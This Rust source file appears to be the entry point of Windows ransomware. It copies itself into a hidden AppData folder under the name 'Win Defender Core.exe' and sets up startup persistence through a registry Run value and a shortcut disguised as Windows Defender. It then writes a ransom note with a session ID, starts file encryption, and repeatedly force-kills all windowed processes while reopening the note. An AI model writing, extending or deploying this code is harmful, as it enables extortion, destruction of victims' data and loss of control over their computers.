#![windows_subsystem = "windows"]

mod win_api;
mod registry;
mod encryptor;

use std::{env, fs, thread};
use std::path::{Path, PathBuf};
use std::borrow::Cow;
use std::time::Duration;
use std::process::Command;
use std::os::windows::process::CommandExt;

use lib::*;

use win_api::*;
use registry::*;

fn main() {
    if !is_admin() {
        message_box(
            "please re run this file with administrator",
            "insufficient permissions"
        );

        return;
    }

    let exec_path: PathBuf = match env::current_exe() {
        Ok(buf) => buf,
        Err(e) => {
            message_box(
                &format!("failed to get exec path: {}", e),
                "error"
            );

            return;
        }
    };

    if !exec_path
        .to_string_lossy()
        .to_lowercase()
        .contains("appdata\\local\\microsoft\\linux") {

        if let Err(err) = init(&exec_path) {
            message_box(
                &format!("failed to init - {}", err),
                "error"
            );

            return;
        }

        return;
    }

    let session_id: String = gen_str(40)
        .to_lowercase();

    let mut note: PathBuf =  env::temp_dir();
    note.push(format!("{}.txt", gen_str(15)));

    let ransom_note: String = include_str!("../../resources/display-note.txt")
        .replace("<SESSION_ID>", &session_id);

    fs::write(&note, &ransom_note)
        .expect("failed to write note");

    encryptor::start(&session_id);

    thread::spawn(move || {
        loop {
            let _ = Command::new("powershell")
                .args(&[
                    "-Command",
                    "Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | ForEach-Object { Stop-Process -Id $_.Id -Force }",
                ])
                .creation_flags(0x08000000)
                .spawn();

            let _ = Command::new("notepad")
                .arg(&note)
                .spawn();

            thread::sleep(Duration::from_secs(6));
        }
    });
}

fn init(exec: &PathBuf) -> Result<(), String> {
    let app_data: String = env::var("LOCALAPPDATA")
        .map_err(|e| format!("failed to get base dir: {}", e))?;

    let target: String = format!("{}\\Microsoft\\Linux", app_data);
    let target_path: &Path = Path::new(&target);

    if !target_path.exists() {
        fs::create_dir_all(target_path)
            .map_err(|e| format!("failed to make folder: {}", e))?;

        hide_item(target_path)
            .map_err(|e| format!("failed to set up folder: {}", e))?;
    }

    let new_exec_path: PathBuf = target_path.join("Win Defender Core.exe");
    let new_exec_path_str: Cow<'_, str> = new_exec_path.to_string_lossy();

    delete_key("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
        .map_err(|e| format!("failed to wash keys: {}", e))?;

    let link: PathBuf = create_link(
        "Windows Defender",
        &new_exec_path_str,
        "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
        "C:\\Windows\\System32\\SecurityHealthSystray.exe"
    ).map_err(|e| format!("failed to create shortcut: {}", e))?;

    set_value(
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Microsoft Defender",
        &link.to_string_lossy()
    ).map_err(|e| format!("failed to set key: {}", e))?;

    fs::copy(exec, &new_exec_path)
        .map_err(|e| format!("failed to copy file: {}", e))?;

    Command::new("cmd")
        .args(&["/C", "start", &new_exec_path_str])
        .creation_flags(0x08000000)
        .spawn()
        .map_err(|e| format!("failed to launch: {}", e))?;

    fs::remove_file(exec)
        .map_err(|e| format!("failed to clean after init: {}", e))?;

    Ok(())
}